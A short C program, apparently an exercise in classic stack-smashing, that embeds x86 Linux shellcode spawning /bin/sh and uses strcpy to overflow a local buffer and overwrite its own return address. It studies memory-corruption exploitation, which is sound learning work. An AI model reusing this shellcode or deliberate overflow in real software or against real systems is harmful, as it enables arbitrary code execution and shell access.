#include <stdio.h>
#include <string.h>

/*
After the gdb debugging step, we obtained the final shellcode. Towards the end, we included the "/bin/sh" command, which will initiate the shell once executed. To overwrite the return address, we utilize the "strcpy" function to copy our large_string containing the shellcode into the buffer. As a test, we incorporated a printf statement with the message "Testing" to verify if the new shell starts functioning. If the attack is successful, the shell will commence immediately after the printf statement.
*/

char shellcode[] =
        "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
        "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
        "\x80\xe8\xdc\xff\xff\xff/bin/sh";

char large_string[128];

void main() {
  char buffer[96];
  int i;
  long *long_ptr = (long *) large_string;

  for (i = 0; i < 32; i++)
    *(long_ptr + i) = (int) buffer;

  for (i = 0; i < strlen(shellcode); i++)
    large_string[i] = shellcode[i];

  printf("Testing");

  strcpy(buffer,large_string);
}
